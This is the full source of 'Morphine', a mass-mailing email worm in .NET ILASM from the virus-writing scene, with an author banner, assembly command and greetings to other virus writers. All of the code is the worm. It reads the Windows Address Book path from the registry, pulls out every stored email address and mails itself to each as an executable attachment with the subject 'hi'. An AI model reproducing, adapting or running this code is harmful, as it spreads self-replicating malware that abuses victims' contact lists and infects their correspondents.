/*******************************************************************************************************************/
/*                                                                                                                 */
/* [ FileName:      Morphine.il ]                                                                                  */
/* [ Programming:    Vorgon/iKX ]                                                                                  */
/* [ Date:    February 28, 2004 ]                                                                                  */
/* [ Size:           3584 Bytes ]                                                                                  */
/*                                                                                                                 */
/* [ Assemble ]                                                                                                    */
/*                                                                                                             */
/*   Assemble with: "ilasm.exe morphine.il /SUBSYSTEM=2"                                                           */
/*                                                                                                                 */
/* [ About ]                                                                                                       */
/*                                                                                                                 */
/*   This is my first worm wrote in ILASM. ILASM is a platform independent assembly language developed by          */
/*   Microsoft. Any computer (not just x86) that has the .net architecture installed can execute this worm.        */
/*   Even Linux is working on incorporating the .net architecture. The worm itself is very simple, it searches     */
/*   the windows address book for email addies, and sends a copy of its self to each one.                          */
/*                                                                                                                 */
/* [ Gr33tz ]                                                                                                      */
/*                                                                                                                 */
/*   T00fic      - You said i could'nt do it. You be WRONG!                                                        */
/*   Slagehammer - Thx for teaching me alittle about the AV side.                                                  */
/*   Raid        - hell: goto hell                                                                                 */
/*   Morphine    - mrf.                                                                                            */
/*   LifeWire    - Nice intro on 29A #7                                                                            */
/*   Micro$oft   - Thankyou for thining the virtual gene pool.                                                     */
/*                                                                                                                 */
/* [ Blah ]                                                                                                        */
/*                                                                                                                 */
/*                                                                                                                 */
/*                                       ~Still she haunts me, phantom wise,                                       */
/*                                            Alice moving under skies                                             */
/*                                           Never seen by waking eyes.                                            */
/*                                                                                                                 */
/*                                         Children yet, the tale to hear,                                         */
/*                                           Eager eye and willing ear,                                            */
/*                                          Lovingly shall nestle near.                                            */
/*                                                                                                                 */
/*                                            In a Wonderland they lie,                                            */
/*                                           Dreaming as the days go by,                                           */
/*                                           Dreaming as the summers die:                                          */
/*                                         Ever drifting down the stream -                                         */
/*                                         Lingering in the golden gleam -                                         */
/*                                          Life, what is it but a dream?~                                         */
/*                                                                                                                 */
/*******************************************************************************************************************/

/*******************************************************************************************************************/
/* Import(s)                                                                                                       */
/*******************************************************************************************************************/

.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )
  .ver 1:0:5000:0
}

.assembly extern System.Web
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )
  .ver 1:0:5000:0
}

/*******************************************************************************************************************/
/* Main Class                                                                                                      */
/*******************************************************************************************************************/

.assembly morphine {}
.class morphine
{
    .method public static void main() il managed
    {
        .maxstack 4          // max variables to have on the stack at one time
        .entrypoint

        /***********************************************************************************************************/
    /* Local Variables                                                                                         */
    /***********************************************************************************************************/

        .locals(class [mscorlib]Microsoft.Win32.RegistryKey regKey,
                string wabFileName,
                class [mscorlib]System.IO.FileStream fileStream,
                class [mscorlib]System.Byte[] wabFileData,
        int32 wabFileSize,
                int32 wabNumberOfEmails,
                int32 wabPointerToEmails,
        string wabEmailAddress,
        string systemUserName,
                int32 tempInt32,
                class [System.Web]System.Web.Mail.MailMessage mailMessage,
                class [System.Web]System.Web.Mail.MailAttachment mailAttachment)

    /***********************************************************************************************************/
    /* Get the path of the windows address book                                                                */
    /***********************************************************************************************************/

    // open registry key "HKEY_CURRENT_USER\Software\Microsoft\WAB\WAB4\Wab File Name"        
    ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey class [mscorlib]Microsoft.Win32.Registry::CurrentUser
        ldstr      "Software\\Microsoft\\WAB\\WAB4\\Wab File Name"
        call       instance class [mscorlib]Microsoft.Win32.RegistryKey class [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
    stloc      regKey  

    // failed to open the key?
    ldloc      regKey
    brfalse    exit
        
    // get the key value
    ldloc      regKey
        ldstr      ""
        call       instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)     
    stloc      wabFileName

    // failed to read the value?
    ldloc      wabFileName
    brfalse    exit     

    // close the registery key
    ldloc      regKey
    call       instance void class [mscorlib]Microsoft.Win32.RegistryKey::Close()

    /***********************************************************************************************************/
    /* Read the entire address book into an array                                                              */
    /***********************************************************************************************************/
        
    // open the windows address book for read only
    ldloc      wabFileName
        ldc.i4.3   // FileMode.Open
        ldc.i4.1   // FileAccess.Read
        newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string, valuetype [mscorlib]System.IO.FileMode, valuetype [mscorlib]System.IO.FileAccess)
    stloc      fileStream

    // get the size of the file
    ldloc      fileStream
    call       instance int64 class [mscorlib]System.IO.FileStream::get_Length()
        
    // convert the file size to a 32bit integer
    call       int32 class [mscorlib]System.Convert::ToInt32(int64)
    stloc      wabFileSize

    // create an array thats the same size as the file
    ldloc      wabFileSize
    newarr     class [mscorlib]System.Byte
    stloc      wabFileData

    // read the entire file into the array
    ldloc      fileStream
        ldloc      wabFileData
    ldc.i4.0
    ldloc      wabFileSize
    call       instance int32 class [mscorlib]System.IO.FileStream::Read(unsigned int8[], int32, int32)
    pop

    // close the file
    ldloc      fileStream
    call       instance void class [mscorlib]System.IO.FileStream::Close()

    /***********************************************************************************************************/
    /* Retrieve each email address from the windows address book                                               */
    /***********************************************************************************************************/

    // get the number of email addresses        
    ldloc      wabFileData
    ldc.i4     100
    call       int32 class [mscorlib]System.BitConverter::ToInt32(unsigned int8[], int32)
    stloc      wabNumberOfEmails

    // no email addresses?
    ldloc      wabNumberOfEmails
    brfalse    exit

    // get a pointer to the email address array
    ldloc      wabFileData
    ldc.i4     96
    call       int32 class [mscorlib]System.BitConverter::ToInt32(unsigned int8[], int32)
    stloc      wabPointerToEmails

massMail:

    // convert the 68 byte array containing a unicode email address to a string object
    call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Unicode()
    ldloc      wabFileData
    ldloc      wabPointerToEmails
    ldc.i4     68
    call       instance string class [mscorlib]System.Text.Encoding::GetString(unsigned int8[], int32, int32)
    stloc      wabEmailAddress

    // determine the length of the email address
    ldloc      wabEmailAddress
    ldc.i4.0
    call       instance int32 class [mscorlib]System.String::IndexOf(char)          
    stloc      tempInt32
        
    // resize the string object
    ldloc      wabEmailAddress
    ldloc      tempInt32
    ldc.i4     34
    ldloc      tempInt32
    sub     
    call       instance string class [mscorlib]System.String::Remove(int32, int32)      
    stloc      wabEmailAddress

    /***********************************************************************************************************/
    /* Send the worm to the email address                                                                      */
    /***********************************************************************************************************/

    // create a MailMessage object
    newobj     instance void class [System.Web]System.Web.Mail.MailMessage::.ctor()
    stloc      mailMessage

    // set the Subject property
    ldloc      mailMessage
    ldstr      "hi"
    call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Subject(string)

    // set the To property
    ldloc      mailMessage
    ldloc      wabEmailAddress
    call       instance void class [System.Web]System.Web.Mail.MailMessage::set_To(string)

    // set the Body property
    ldloc      mailMessage
    ldstr      "hi"
    call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Body(string)

    // set the BodyFormat property
    ldloc      mailMessage
    ldc.i4.0  // MailFormat.Text
    call       instance void class [System.Web]System.Web.Mail.MailMessage::set_BodyFormat(valuetype [System.Web]System.Web.Mail.MailFormat)

    // set the Priority property
    ldloc      mailMessage
    ldc.i4.2  // MailPriority.High
    call       instance void class [System.Web]System.Web.Mail.MailMessage::set_Priority(valuetype [System.Web]System.Web.Mail.MailPriority)

    // create a mail attachment object
    call       string class [mscorlib]System.IO.Directory::GetCurrentDirectory()
    ldstr      "\\morphine.exe"
    call       string class [mscorlib]System.String::Concat(string, string)
        ldc.i4.1  // MailEncoding.Base64
        newobj     instance void class [System.Web]System.Web.Mail.MailAttachment::.ctor(string, valuetype [System.Web]System.Web.Mail.MailEncoding)
    stloc      mailAttachment

    // create a collection
    ldloc      mailMessage
        call       instance class [mscorlib]System.Collections.IList class [System.Web]System.Web.Mail.MailMessage::get_Attachments()
 
    // add the file attachment to the collection
        ldloc      mailAttachment
        callvirt   instance int32 class [mscorlib]System.Collections.IList::Add(object)
        pop

    // send the email
    ldloc      mailMessage
    call       void class [System.Web]System.Web.Mail.SmtpMail::Send(class [System.Web]System.Web.Mail.MailMessage)

    /***********************************************************************************************************/
    /* Seek to the next email address if there is one                                                          */
    /***********************************************************************************************************/

    // next email address
    ldloc      wabPointerToEmails
    ldc.i4     68
    add
    stloc      wabPointerToEmails

    // decrement the counter
    ldloc      wabNumberOfEmails
    ldc.i4.1
    sub
    stloc      wabNumberOfEmails

    // still more emails left?
    ldloc      wabNumberOfEmails
    ldc.i4.0
    bgt        massMail

    /***********************************************************************************************************/
    /* exit                                                                                                    */           
    /***********************************************************************************************************/
                                                    
exit:              
        ret
    }
}
